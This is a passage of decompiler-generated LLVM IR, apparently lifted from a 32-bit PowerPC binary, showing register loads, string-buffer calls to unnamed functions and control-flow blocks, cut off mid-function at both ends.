  %v0_100009a8 = load i32, i32* %r22.global-to-local, align 4
  %v1_100009a8 = load i32, i32* %r29.global-to-local, align 4
  %v2_100009a8 = add i32 %v1_100009a8, %v0_100009a8
  store i32 %v2_100009a8, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100009b0.29 to i32), i32* %lr.global-to-local, align 4
  %v2_100009ac = inttoptr i32 %v2_100009a8 to i8*
  %v3_100009ac = call i32 @function_1000ab8c(i8* %v2_100009ac, i32 %v3_100009a0)
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 268437944, i32* @lr, align 4
  %v1_100009b4 = call i32 @function_1000a260(i32 32)
  %v0_100009b8 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_100009b8, i32* %r3.global-to-local, align 4
  store i32 268437952, i32* @lr, align 4
  %v1_100009bc = inttoptr i32 %v0_100009b8 to i8*
  %v2_100009bc = call i32 @function_1000ab64(i8* %v1_100009bc)
  %v0_100009c0 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_100009c0, i32* %r4.global-to-local, align 4
  %v0_100009c4 = load i32, i32* %r22.global-to-local, align 4
  %v2_100009c4 = add i32 %v0_100009c4, %v2_100009bc
  store i32 %v2_100009c4, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100009cc.30 to i32), i32* %lr.global-to-local, align 4
  %v3_100009c8 = inttoptr i32 %v2_100009c4 to i8*
  %v4_100009c8 = call i32 @function_1000ab8c(i8* %v3_100009c8, i32 %v0_100009c0)
  store i32 33, i32* %r3.global-to-local, align 4
  store i32 268437972, i32* @lr, align 4
  %v1_100009d0 = call i32 @function_1000a2ec(i32 33)
  %v0_100009d4 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_100009d4, i32* %r3.global-to-local, align 4
  store i32 268437980, i32* @lr, align 4
  %v1_100009d8 = inttoptr i32 %v0_100009d4 to i8*
  %v2_100009d8 = call i32 @function_1000ab64(i8* %v1_100009d8)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_100009d8, i32* %r29.global-to-local, align 4
  store i32 33, i32* %r3.global-to-local, align 4
  store i32 268437996, i32* %lr.global-to-local, align 4
  %v3_100009e8 = call i32 @function_1000a238(i32 33, i32* null)
  store i32 %v3_100009e8, i32* %r4.global-to-local, align 4
  %v0_100009f0 = load i32, i32* %r22.global-to-local, align 4
  %v1_100009f0 = load i32, i32* %r29.global-to-local, align 4
  %v2_100009f0 = add i32 %v1_100009f0, %v0_100009f0
  store i32 %v2_100009f0, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100009f8.31 to i32), i32* %lr.global-to-local, align 4
  %v2_100009f4 = inttoptr i32 %v2_100009f0 to i8*
  %v3_100009f4 = call i32 @function_1000ab8c(i8* %v2_100009f4, i32 %v3_100009e8)
  store i32 33, i32* %r3.global-to-local, align 4
  store i32 268438016, i32* @lr, align 4
  %v1_100009fc = call i32 @function_1000a260(i32 33)
  %v0_10000a00 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000a00, i32* %r3.global-to-local, align 4
  store i32 268438024, i32* @lr, align 4
  %v1_10000a04 = inttoptr i32 %v0_10000a00 to i8*
  %v2_10000a04 = call i32 @function_1000ab64(i8* %v1_10000a04)
  %v0_10000a08 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000a08, i32* %r4.global-to-local, align 4
  %v0_10000a0c = load i32, i32* %r22.global-to-local, align 4
  %v2_10000a0c = add i32 %v0_10000a0c, %v2_10000a04
  store i32 %v2_10000a0c, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000a14.32 to i32), i32* %lr.global-to-local, align 4
  %v3_10000a10 = inttoptr i32 %v2_10000a0c to i8*
  %v4_10000a10 = call i32 @function_1000ab8c(i8* %v3_10000a10, i32 %v0_10000a08)
  store i32 34, i32* %r3.global-to-local, align 4
  store i32 268438044, i32* @lr, align 4
  %v1_10000a18 = call i32 @function_1000a2ec(i32 34)
  %v0_10000a1c = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000a1c, i32* %r3.global-to-local, align 4
  store i32 268438052, i32* @lr, align 4
  %v1_10000a20 = inttoptr i32 %v0_10000a1c to i8*
  %v2_10000a20 = call i32 @function_1000ab64(i8* %v1_10000a20)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a20, i32* %r29.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  store i32 268438068, i32* %lr.global-to-local, align 4
  %v3_10000a30 = call i32 @function_1000a238(i32 34, i32* null)
  store i32 %v3_10000a30, i32* %r4.global-to-local, align 4
  %v0_10000a38 = load i32, i32* %r22.global-to-local, align 4
  %v1_10000a38 = load i32, i32* %r29.global-to-local, align 4
  %v2_10000a38 = add i32 %v1_10000a38, %v0_10000a38
  store i32 %v2_10000a38, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000a40.33 to i32), i32* %lr.global-to-local, align 4
  %v2_10000a3c = inttoptr i32 %v2_10000a38 to i8*
  %v3_10000a3c = call i32 @function_1000ab8c(i8* %v2_10000a3c, i32 %v3_10000a30)
  store i32 34, i32* %r3.global-to-local, align 4
  store i32 268438088, i32* @lr, align 4
  %v1_10000a44 = call i32 @function_1000a260(i32 34)
  %v0_10000a48 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000a48, i32* %r3.global-to-local, align 4
  store i32 268438096, i32* @lr, align 4
  %v1_10000a4c = inttoptr i32 %v0_10000a48 to i8*
  %v2_10000a4c = call i32 @function_1000ab64(i8* %v1_10000a4c)
  %v0_10000a50 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000a50, i32* %r4.global-to-local, align 4
  %v0_10000a54 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000a54 = add i32 %v0_10000a54, %v2_10000a4c
  store i32 %v2_10000a54, i32* @r3, align 4
  store i32 268438108, i32* %lr.global-to-local, align 4
  %v3_10000a58 = inttoptr i32 %v2_10000a54 to i8*
  %v4_10000a58 = call i32 @function_1000ab8c(i8* %v3_10000a58, i32 %v0_10000a50)
  store i32 %v4_10000a58, i32* %r3.global-to-local, align 4
  %v0_10000a5c = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10000a5c, label %dec_label_pc_10000b18, label %dec_label_pc_10000a60

dec_label_pc_10000a60:                            ; preds = %dec_label_pc_100008b0
  store i32 35, i32* %r3.global-to-local, align 4
  store i32 268438120, i32* @lr, align 4
  %v1_10000a64 = call i32 @function_1000a2ec(i32 35)
  %v0_10000a68 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000a68, i32* %r3.global-to-local, align 4
  store i32 268438128, i32* @lr, align 4
  %v1_10000a6c = inttoptr i32 %v0_10000a68 to i8*
  %v2_10000a6c = call i32 @function_1000ab64(i8* %v1_10000a6c)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a6c, i32* %r29.global-to-local, align 4
  store i32 35, i32* %r3.global-to-local, align 4
  store i32 268438144, i32* %lr.global-to-local, align 4
  %v3_10000a7c = call i32 @function_1000a238(i32 35, i32* null)
  store i32 %v3_10000a7c, i32* %r4.global-to-local, align 4
  %v0_10000a84 = load i32, i32* %r22.global-to-local, align 4
  %v1_10000a84 = load i32, i32* %r29.global-to-local, align 4
  %v2_10000a84 = add i32 %v1_10000a84, %v0_10000a84
  store i32 %v2_10000a84, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000a8c.34 to i32), i32* %lr.global-to-local, align 4
  %v2_10000a88 = inttoptr i32 %v2_10000a84 to i8*
  %v3_10000a88 = call i32 @function_1000ab8c(i8* %v2_10000a88, i32 %v3_10000a7c)
  store i32 35, i32* %r3.global-to-local, align 4
  store i32 268438164, i32* @lr, align 4
  %v1_10000a90 = call i32 @function_1000a260(i32 35)
  %v0_10000a94 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000a94, i32* %r3.global-to-local, align 4
  store i32 268438172, i32* @lr, align 4
  %v1_10000a98 = inttoptr i32 %v0_10000a94 to i8*
  %v2_10000a98 = call i32 @function_1000ab64(i8* %v1_10000a98)
  %v0_10000a9c = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000a9c, i32* %r4.global-to-local, align 4
  %v0_10000aa0 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000aa0 = add i32 %v0_10000aa0, %v2_10000a98
  store i32 %v2_10000aa0, i32* @r3, align 4
  store i32 268438184, i32* %lr.global-to-local, align 4
  %v3_10000aa4 = inttoptr i32 %v2_10000aa0 to i8*
  %v4_10000aa4 = call i32 @function_1000ab8c(i8* %v3_10000aa4, i32 %v0_10000a9c)
  %v0_10000aa8 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000aa8, i32* %r3.global-to-local, align 4
  store i32 268438192, i32* @lr, align 4
  %v1_10000aac = inttoptr i32 %v0_10000aa8 to i8*
  %v2_10000aac = call i32 @function_1000ab64(i8* %v1_10000aac)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_10000aac, i32* %r29.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 268438208, i32* %lr.global-to-local, align 4
  %v3_10000abc = call i32 @function_1000a238(i32 40, i32* null)
  store i32 %v3_10000abc, i32* %r4.global-to-local, align 4
  %v0_10000ac4 = load i32, i32* %r22.global-to-local, align 4
  %v1_10000ac4 = load i32, i32* %r29.global-to-local, align 4
  %v2_10000ac4 = add i32 %v1_10000ac4, %v0_10000ac4
  store i32 %v2_10000ac4, i32* @r3, align 4
  store i32 268438220, i32* %lr.global-to-local, align 4
  %v2_10000ac8 = inttoptr i32 %v2_10000ac4 to i8*
  %v3_10000ac8 = call i32 @function_1000ab8c(i8* %v2_10000ac8, i32 %v3_10000abc)
  %v0_10000acc = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000acc, i32* %r3.global-to-local, align 4
  store i32 268438228, i32* @lr, align 4
  %v1_10000ad0 = inttoptr i32 %v0_10000acc to i8*
  %v2_10000ad0 = call i32 @function_1000ab64(i8* %v1_10000ad0)
  %v0_10000ad4 = load i32, i32* %r16.global-to-local, align 4
  store i32 %v0_10000ad4, i32* %r4.global-to-local, align 4
  %v0_10000ad8 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000ad8 = add i32 %v0_10000ad8, %v2_10000ad0
  store i32 %v2_10000ad8, i32* @r3, align 4
  store i32 268438240, i32* %lr.global-to-local, align 4
  %v2_10000adc = inttoptr i32 %v2_10000ad8 to i8*
  %v3_10000adc = call i32 @function_1000ab8c(i8* %v2_10000adc, i32 %v0_10000ad4)
  store i32 %v3_10000adc, i32* %r3.global-to-local, align 4
  %v0_10000ae0 = load i32, i32* @r1, align 4
  %v1_10000ae0 = add i32 %v0_10000ae0, 20804
  %v2_10000ae0 = inttoptr i32 %v1_10000ae0 to i32*
  %v3_10000ae0 = load i32, i32* %v2_10000ae0, align 4
  store i32 %v3_10000ae0, i32* %r3.global-to-local, align 4
  store i32 268438248, i32* @lr, align 4
  %v1_10000ae4 = inttoptr i32 %v3_10000ae0 to i8*
  %v2_10000ae4 = call i32 @function_1000ab64(i8* %v1_10000ae4)
  store i32 %v2_10000ae4, i32* %r29.global-to-local, align 4
  %v0_10000aec = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000aec, i32* %r3.global-to-local, align 4
  store i32 268438260, i32* @lr, align 4
  %v1_10000af0 = inttoptr i32 %v0_10000aec to i8*
  %v2_10000af0 = call i32 @function_1000ab64(i8* %v1_10000af0)
  store i32 10, i32* %r4.global-to-local, align 4
  %v0_10000af8 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000af8 = add i32 %v0_10000af8, %v2_10000af0
  %v0_10000afc = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10000afc, i32* %r3.global-to-local, align 4
  store i32 268438276, i32* %lr.global-to-local, align 4
  %v3_10000b00 = trunc i32 %v0_10000afc to i8
  %v4_10000b00 = call i32 @function_1000b0c4(i8 %v3_10000b00, i32 10, i32 %v2_10000af8)
  %v0_10000b04 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000b04, i32* %r3.global-to-local, align 4
  store i32 268438284, i32* @lr, align 4
  %v1_10000b08 = inttoptr i32 %v0_10000b04 to i8*
  %v2_10000b08 = call i32 @function_1000ab64(i8* %v1_10000b08)
  %v0_10000b0c = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000b0c, i32* %r4.global-to-local, align 4
  %v0_10000b10 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000b10 = add i32 %v0_10000b10, %v2_10000b08
  store i32 %v2_10000b10, i32* @r3, align 4
  store i32 268438296, i32* %lr.global-to-local, align 4
  %v3_10000b14 = inttoptr i32 %v2_10000b10 to i8*
  %v4_10000b14 = call i32 @function_1000ab8c(i8* %v3_10000b14, i32 %v0_10000b0c)
  store i32 %v4_10000b14, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000b18

dec_label_pc_10000b18:                            ; preds = %dec_label_pc_100008b0, %dec_label_pc_10000a60
  %v0_10000b18 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000b18 = add i32 %v0_10000b18, 1468
  %v2_10000b18 = inttoptr i32 %v1_10000b18 to i32*
  %v3_10000b18 = load i32, i32* %v2_10000b18, align 4
  store i32 %v3_10000b18, i32* %r0.global-to-local, align 4
  %v1_10000b1c = icmp slt i32 %v3_10000b18, 0
  %v2_10000b1c = icmp sgt i32 %v3_10000b18, 0
  %v3_10000b1c = icmp eq i32 %v3_10000b18, 0
  store i1 %v1_10000b1c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000b1c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000b1c, i1* %cr7_eq.global-to-local, align 1
  %tmp69 = icmp slt i32 %v3_10000b18, 1
  br i1 %tmp69, label %dec_label_pc_10000bb8, label %dec_label_pc_10000b24

dec_label_pc_10000b24:                            ; preds = %dec_label_pc_10000b18
  %v0_10000b24 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000b24, i32* %r3.global-to-local, align 4
  store i32 268438316, i32* @lr, align 4
  %v1_10000b28 = inttoptr i32 %v0_10000b24 to i8*
  %v2_10000b28 = call i32 @function_1000ab64(i8* %v1_10000b28)
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10000b30 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000b30 = add i32 %v0_10000b30, %v2_10000b28
  store i32 %v2_10000b30, i32* @r3, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1000de48.35 to i32), i32* %r4.global-to-local, align 4
  store i32 268438332, i32* %lr.global-to-local, align 4
  %v3_10000b38 = inttoptr i32 %v2_10000b30 to i8*
  %v4_10000b38 = call i32 @function_1000ab8c(i8* %v3_10000b38, i32 ptrtoint ([9 x i8]* @global_var_1000de48.35 to i32))
  store i32 %v4_10000b38, i32* %r3.global-to-local, align 4
  %v0_10000b3c = load i32, i32* %r30.global-to-local, align 4
  %v1_10000b3c = add i32 %v0_10000b3c, 1468
  %v2_10000b3c = inttoptr i32 %v1_10000b3c to i32*
  %v3_10000b3c = load i32, i32* %v2_10000b3c, align 4
  store i32 %v3_10000b3c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_10000b44 = icmp slt i32 %v3_10000b3c, 0
  %v2_10000b44 = icmp sgt i32 %v3_10000b3c, 0
  %v3_10000b44 = icmp eq i32 %v3_10000b3c, 0
  store i1 %v1_10000b44, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000b44, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000b44, i1* %cr7_eq.global-to-local, align 1
  %v1_10000b48 = load i32, i32* @r1, align 4
  %v2_10000b48 = add i32 %v1_10000b48, 8
  %v3_10000b48 = inttoptr i32 %v2_10000b48 to i32*
  store i32 0, i32* %v3_10000b48, align 4
  %tmp70 = icmp slt i32 %v3_10000b3c, 1
  br i1 %tmp70, label %dec_label_pc_10000ba0, label %dec_label_pc_10000b50

dec_label_pc_10000b50:                            ; preds = %dec_label_pc_10000b24, %dec_label_pc_10000b50
  %v0_10000b50 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000b50, i32* %r3.global-to-local, align 4
  store i32 268438360, i32* @lr, align 4
  %v1_10000b54 = inttoptr i32 %v0_10000b50 to i8*
  %v2_10000b54 = call i32 @function_1000ab64(i8* %v1_10000b54)
  store i32 %v2_10000b54, i32* %r3.global-to-local, align 4
  %v0_10000b58 = load i32, i32* @r1, align 4
  %v1_10000b58 = add i32 %v0_10000b58, 8
  %v2_10000b58 = inttoptr i32 %v1_10000b58 to i32*
  %v3_10000b58 = load i32, i32* %v2_10000b58, align 4
  %v0_10000b5c = load i32, i32* %r22.global-to-local, align 4
  %v2_10000b5c = add i32 %v0_10000b5c, %v2_10000b54
  store i32 %v2_10000b5c, i32* @r3, align 4
  %v1_10000b60 = mul i32 %v3_10000b58, 128
  %v1_10000b64 = add i32 %v1_10000b60, 1472
  %v0_10000b68 = load i32, i32* %r30.global-to-local, align 4
  %v2_10000b68 = add i32 %v1_10000b64, %v0_10000b68
  store i32 %v2_10000b68, i32* %r4.global-to-local, align 4
  store i32 268438384, i32* %lr.global-to-local, align 4
  %v2_10000b6c = inttoptr i32 %v2_10000b5c to i8*
  %v3_10000b6c = call i32 @function_1000ab8c(i8* %v2_10000b6c, i32 %v2_10000b68)
  %v0_10000b70 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000b70, i32* %r3.global-to-local, align 4
  store i32 268438392, i32* @lr, align 4
  %v1_10000b74 = inttoptr i32 %v0_10000b70 to i8*
  %v2_10000b74 = call i32 @function_1000ab64(i8* %v1_10000b74)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000de54.36 to i32), i32* %r4.global-to-local, align 4
  %v0_10000b80 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000b80 = add i32 %v0_10000b80, %v2_10000b74
  store i32 %v2_10000b80, i32* @r3, align 4
  store i32 268438408, i32* %lr.global-to-local, align 4
  %v3_10000b84 = inttoptr i32 %v2_10000b80 to i8*
  %v4_10000b84 = call i32 @function_1000ab8c(i8* %v3_10000b84, i32 ptrtoint ([3 x i8]* @global_var_1000de54.36 to i32))
  store i32 %v4_10000b84, i32* %r3.global-to-local, align 4
  %v0_10000b88 = load i32, i32* @r1, align 4
  %v1_10000b88 = add i32 %v0_10000b88, 8
  %v2_10000b88 = inttoptr i32 %v1_10000b88 to i32*
  %v3_10000b88 = load i32, i32* %v2_10000b88, align 4
  store i32 %v3_10000b88, i32* %r9.global-to-local, align 4
  %v0_10000b8c = load i32, i32* %r30.global-to-local, align 4
  %v1_10000b8c = add i32 %v0_10000b8c, 1468
  %v2_10000b8c = inttoptr i32 %v1_10000b8c to i32*
  %v3_10000b8c = load i32, i32* %v2_10000b8c, align 4
  store i32 %v3_10000b8c, i32* %r0.global-to-local, align 4
  %v1_10000b90 = add i32 %v3_10000b88, 1
  store i32 %v1_10000b90, i32* %r11.global-to-local, align 4
  %v2_10000b94 = icmp slt i32 %v3_10000b8c, %v1_10000b90
  %v3_10000b94 = icmp sgt i32 %v3_10000b8c, %v1_10000b90
  %v4_10000b94 = icmp eq i32 %v3_10000b8c, %v1_10000b90
  store i1 %v2_10000b94, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000b94, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10000b94, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10000b90, i32* %v2_10000b88, align 4
  br i1 %v3_10000b94, label %dec_label_pc_10000b50, label %dec_label_pc_10000ba0

dec_label_pc_10000ba0:                            ; preds = %dec_label_pc_10000b50, %dec_label_pc_10000b24
  %v0_10000ba0 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000ba0, i32* %r3.global-to-local, align 4
  store i32 268438440, i32* @lr, align 4
  %v1_10000ba4 = inttoptr i32 %v0_10000ba0 to i8*
  %v2_10000ba4 = call i32 @function_1000ab64(i8* %v1_10000ba4)
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10000bac = load i32, i32* %r22.global-to-local, align 4
  %v2_10000bac = add i32 %v0_10000bac, %v2_10000ba4
  store i32 %v2_10000bac, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000de34.24 to i32), i32* %r4.global-to-local, align 4
  store i32 268438456, i32* %lr.global-to-local, align 4
  %v3_10000bb4 = inttoptr i32 %v2_10000bac to i8*
  %v4_10000bb4 = call i32 @function_1000ab8c(i8* %v3_10000bb4, i32 ptrtoint ([3 x i8]* @global_var_1000de34.24 to i32))
  store i32 %v4_10000bb4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000bb8

dec_label_pc_10000bb8:                            ; preds = %dec_label_pc_10000b18, %dec_label_pc_10000ba0
  %v0_10000bb8 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000bb8, i32* %r3.global-to-local, align 4
  store i32 268438464, i32* @lr, align 4
  %v1_10000bbc = inttoptr i32 %v0_10000bb8 to i8*
  %v2_10000bbc = call i32 @function_1000ab64(i8* %v1_10000bbc)
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10000bc4 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000bc4 = add i32 %v0_10000bc4, %v2_10000bbc
  store i32 %v2_10000bc4, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000de34.24 to i32), i32* %r4.global-to-local, align 4
  store i32 268438480, i32* %lr.global-to-local, align 4
  %v3_10000bcc = inttoptr i32 %v2_10000bc4 to i8*
  %v4_10000bcc = call i32 @function_1000ab8c(i8* %v3_10000bcc, i32 ptrtoint ([3 x i8]* @global_var_1000de34.24 to i32))
  store i32 %v4_10000bcc, i32* %r3.global-to-local, align 4
  %v0_10000bd0 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10000bd0, label %dec_label_pc_10000be8, label %dec_label_pc_10000bd4

dec_label_pc_10000bd4:                            ; preds = %dec_label_pc_10000bb8
  %v0_10000bd4 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000bd4, i32* %r3.global-to-local, align 4
  store i32 268438492, i32* @lr, align 4
  %v1_10000bd8 = inttoptr i32 %v0_10000bd4 to i8*
  %v2_10000bd8 = call i32 @function_1000ab64(i8* %v1_10000bd8)
  store i32 %v2_10000bd8, i32* %r3.global-to-local, align 4
  %v0_10000bdc = load i32, i32* @r1, align 4
  %v1_10000bdc = add i32 %v0_10000bdc, 20804
  %v2_10000bdc = inttoptr i32 %v1_10000bdc to i32*
  %v3_10000bdc = load i32, i32* %v2_10000bdc, align 4
  store i32 %v3_10000bdc, i32* %r4.global-to-local, align 4
  %v0_10000be0 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000be0 = add i32 %v0_10000be0, %v2_10000bd8
  store i32 %v2_10000be0, i32* @r3, align 4
  store i32 268438504, i32* %lr.global-to-local, align 4
  %v2_10000be4 = inttoptr i32 %v2_10000be0 to i8*
  %v3_10000be4 = call i32 @function_1000ab8c(i8* %v2_10000be4, i32 %v3_10000bdc)
  store i32 %v3_10000be4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000be8

dec_label_pc_10000be8:                            ; preds = %dec_label_pc_10000bb8, %dec_label_pc_10000bd4
  %v0_10000be8 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000be8 = add i32 %v0_10000be8, 1440
  store i32 %v1_10000be8, i32* @r31, align 4
  %v0_10000bec = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10000bec, i32* %r3.global-to-local, align 4
  store i32 %v1_10000be8, i32* %r4.global-to-local, align 4
  store i32 268438520, i32* %lr.global-to-local, align 4
  %v2_10000bf4 = inttoptr i32 %v0_10000bec to i8*
  %v3_10000bf4 = call i32 @function_1000afc0(i8* %v2_10000bf4, i32 %v1_10000be8)
  store i32 %v3_10000bf4, i32* %r3.global-to-local, align 4
  %v1_10000bf8 = icmp slt i32 %v3_10000bf4, 0
  %v2_10000bf8 = icmp sgt i32 %v3_10000bf4, 0
  %v3_10000bf8 = icmp eq i32 %v3_10000bf4, 0
  store i1 %v1_10000bf8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000bf8, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000bf8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000bf8, label %dec_label_pc_10001508, label %dec_label_pc_10000c00

dec_label_pc_10000c00:                            ; preds = %dec_label_pc_10000be8, %dec_label_pc_10001508
  %v0_10000c00 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000c00 = inttoptr i32 %v0_10000c00 to i32*
  %v2_10000c00 = load i32, i32* %v1_10000c00, align 4
  store i32 %v2_10000c00, i32* %r29.global-to-local, align 4
  %v0_10000c04 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000c04, i32* %r3.global-to-local, align 4
  store i32 268438540, i32* @lr, align 4
  %v1_10000c08 = inttoptr i32 %v0_10000c04 to i8*
  %v2_10000c08 = call i32 @function_1000ab64(i8* %v1_10000c08)
  %v0_10000c0c = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000c0c, i32* %r4.global-to-local, align 4
  %v0_10000c18 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10000c18, i32* %r3.global-to-local, align 4
  store i32 268438560, i32* @lr, align 4
  %v4_10000c1c = call i32 @function_1000c108(i32 %v0_10000c18, i32 %v0_10000c0c, i32 %v2_10000c08, i32 16384)
  store i32 %v4_10000c1c, i32* %r3.global-to-local, align 4
  %v0_10000c20 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000c20 = inttoptr i32 %v0_10000c20 to i32*
  %v2_10000c20 = load i32, i32* %v1_10000c20, align 4
  %v0_10000c24 = load i32, i32* %r25.global-to-local, align 4
  %v2_10000c24 = add i32 %v0_10000c20, 12
  %v3_10000c24 = inttoptr i32 %v2_10000c24 to i32*
  store i32 %v0_10000c24, i32* %v3_10000c24, align 4
  %v1_10000c28 = call i32 @__asm_rlwinm(i32 %v2_10000c20, i32 29, i32 3, i32 29)
  %v0_10000c2c = load i32, i32* %r26.global-to-local, align 4
  %v2_10000c2c = icmp slt i32 %v0_10000c2c, %v2_10000c20
  %v3_10000c2c = icmp sgt i32 %v0_10000c2c, %v2_10000c20
  %v4_10000c2c = icmp eq i32 %v0_10000c2c, %v2_10000c20
  store i1 %v2_10000c2c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000c2c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10000c2c, i1* %cr7_eq.global-to-local, align 1
  %v1_10000c30 = load i32, i32* %r18.global-to-local, align 4
  %v2_10000c30 = add i32 %v1_10000c30, %v1_10000c28
  store i32 %v2_10000c30, i32* %r11.global-to-local, align 4
  %v1_10000c34 = urem i32 %v2_10000c20, 32
  store i32 %v1_10000c34, i32* %r0.global-to-local, align 4
  %v1_10000c38 = add i32 %v2_10000c30, 36
  %v2_10000c38 = inttoptr i32 %v1_10000c38 to i32*
  %v3_10000c38 = load i32, i32* %v2_10000c38, align 4
  %v0_10000c3c = load i32, i32* %r23.global-to-local, align 4
  %v3_10000c3c = shl i32 %v0_10000c3c, %v1_10000c34
  %v2_10000c40 = or i32 %v3_10000c3c, %v3_10000c38
  store i32 %v2_10000c40, i32* %r9.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  store i32 %v2_10000c40, i32* %v2_10000c38, align 4
  %v0_10000c4c = load i32, i32* %r0.global-to-local, align 4
  %v1_10000c4c = trunc i32 %v0_10000c4c to i8
  %v2_10000c4c = load i32, i32* %r30.global-to-local, align 4
  %v3_10000c4c = add i32 %v2_10000c4c, 4
  %v4_10000c4c = inttoptr i32 %v3_10000c4c to i8*
  store i8 %v1_10000c4c, i8* %v4_10000c4c, align 1
  %v0_10000c50 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10000c50 = load i1, i1* %cr7_gt.global-to-local, align 1
  %v2_10000c50 = or i1 %v0_10000c50, %v1_10000c50
  br i1 %v2_10000c50, label %dec_label_pc_10000678, label %dec_label_pc_10000c54

dec_label_pc_10000c54:                            ; preds = %dec_label_pc_10000c00
  %v1_10000c54 = add i32 %v2_10000c20, 1
  store i32 %v1_10000c54, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10000784

dec_label_pc_10000c5c:                            ; preds = %dec_label_pc_10000660, %dec_label_pc_10000658, %dec_label_pc_10000650
  %v1_10000c5c = inttoptr i32 %v2_10000c8c to i32*
  %v2_10000c5c = load i32, i32* %v1_10000c5c, align 4
  %v1_10000c60 = call i32 @__asm_rlwinm(i32 %v2_10000c5c, i32 29, i32 3, i32 29)
  %v0_10000c64 = load i32, i32* %r26.global-to-local, align 4
  %v2_10000c64 = icmp slt i32 %v0_10000c64, %v2_10000c5c
  %v3_10000c64 = icmp sgt i32 %v0_10000c64, %v2_10000c5c
  %v4_10000c64 = icmp eq i32 %v0_10000c64, %v2_10000c5c
  store i1 %v2_10000c64, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000c64, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10000c64, i1* %cr7_eq.global-to-local, align 1
  %v1_10000c68 = load i32, i32* %r18.global-to-local, align 4
  %v2_10000c68 = add i32 %v1_10000c68, %v1_10000c60
  store i32 %v2_10000c68, i32* %r11.global-to-local, align 4
  %v1_10000c6c = urem i32 %v2_10000c5c, 32
  store i32 %v1_10000c6c, i32* %r0.global-to-local, align 4
